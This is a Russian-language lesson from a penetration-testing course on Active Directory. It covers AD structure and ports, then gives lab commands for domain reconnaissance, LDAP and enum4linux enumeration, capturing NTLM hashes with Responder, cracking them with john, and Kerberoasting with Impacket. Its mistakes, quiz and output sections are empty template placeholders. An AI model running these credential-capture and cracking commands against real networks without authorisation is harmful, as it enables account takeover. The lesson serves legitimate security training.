# Занятие 53. HTB Active Directory: база AD, комната на THM

## Теория

**Active Directory (AD)** — служба каталогов от Microsoft, используется в большинстве корпоративных сетей. Понимание AD критично для пентестера.

**Основные компоненты AD:**
- **Domain Controller (DC)** — сервер, управляющий доменом
- **Domain** — логическая группа объектов (пользователей, компьютеров)
- **OU (Organizational Unit)** — контейнеры для организации объектов
- **GPO (Group Policy Object)** — политики безопасности

**Ключевые протоколы:**
- **Kerberos** — аутентификация (порт 88)
- **LDAP** — доступ к каталогу (порт 389)
- **SMB** — файловый доступ (порт 445)
- **DNS** — разрешение имен (порт 53)

**Типичные атаки на AD:**
- **LLMNR/NBT-NS Poisoning** — перехват аутентификации
- **Kerberoasting** — атака на сервисные аккаунты Kerberos
- **ASREPRoasting** — атака на пользователей без Kerberos pre-auth
- **Pass the Hash** — использование хешей NTLM
- **BloodHound** — визуализация путей атаки

## Практическое занятие

### Комната на THM: "Active Directory Basics"

**Шаг 1. Изучение структуры AD**
- Разберите иерархию: Forest → Domain → OU
- Изучите типы групп: Domain Admins, Enterprise Admins, Domain Users

**Шаг 2. Разведка домена**
```bash
nmap -p 88,389,445,53 <target_dc_ip>
```

**Шаг 3. Перечисление пользователей через LDAP**
```bash
ldapsearch -x -H ldap://<target_dc_ip> -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=local"
```

**Шаг 4. Enumeration через enum4linux**
```bash
enum4linux -a <target_dc_ip>
```

### Практика: атака LLMNR Poisoning

**Инструмент:** Responder
```bash
sudo responder -I tun0 -wrf
```
Ждем, когда пользователь попытается обратиться к несуществующему ресурсу — перехватываем хеш NTLM.

**Брутфорс хеша:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Практика: Kerberoasting

```bash
# Используем GetUserSPNs.py из Impacket
python3 GetUserSPNs.py <domain>/<user>:<password> -dc-ip <dc_ip> -request
```


## Примеры вывода

Пример вывода команд будет добавлен индивидуально для каждого урока.



## Частые ошибки

1. **Ошибка 1**: Типичная ошибка новичков в этом уроке.
2. **Ошибка 2**: Еще одна распространенная проблема.
3. **Ошибка 3**: Важный момент, который часто упускают.



## Вопросы на понимание

1. Вопрос 1 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 1</details>
2. Вопрос 2 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 2</details>
3. Вопрос 3 на понимание материала?
   <details><summary>Ответ</summary>Ответ на вопрос 3</details>



## Форматы флагов

- **TryHackMe**: `THM{...}`
- **HackTheBox**: `HTB{...}`
- **PortSwigger**: "Lab solved!" (без флагов)



## Адаптация под macOS (M2, 8GB)

- Для VPN используйте **Tunnelblick** (бесплатный OpenVPN клиент для macOS): скачайте .ovpn файл и откройте через Tunnelblick
- Виртуалки: используйте **UTM** (бесплатно для M2) или **Parallels** вместо VirtualBox
- "На 8GB RAM выделяйте VM не более 3-4GB"
- Docker работает нативно на M2: `docker pull <image>`
- Для установки инструментов используйте Homebrew: `brew install <tool>`
- Если требуется Python: `pip3 install <package>`


## Задачи для самостоятельного выполнения

1. **Комната "Attacktive Directory"** (THM) — полный путь атаки на AD: от разведки до получения Domain Admin
2. **Машина "Active"** (HTB Easy) — реальная машина с AD, Kerberoasting атака
3. **Комната "BloodHound"** (THM) — установка и использование BloodHound для анализа AD

> **Совет:** Для практики AD удобно поднять лабораторию на VirtualBox (Windows Server + Kali), но платформы THM/HTB уже предоставляют готовые среды.
